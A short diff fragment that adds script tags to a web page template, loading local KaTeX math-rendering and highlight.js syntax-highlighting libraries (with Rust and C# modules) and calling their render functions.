+        <script src="/wednesday/libs/katex/katex.min.js"></script>
+<script src="/wednesday/libs/katex/contrib/auto-render.min.js"></script>
+<script>renderMathInElement(document.body)</script>
+
+    
+    
+        <script src="/wednesday/libs/highlight/highlight.min.js"></script>
+<script src="/wednesday/libs/highlight/rust.min.js"></script>
+<script src="/wednesday/libs/highlight/csharp.min.js"></script>
+<script>hljs.highlightAll();hljs.configure({tabReplace: '    '});</script>
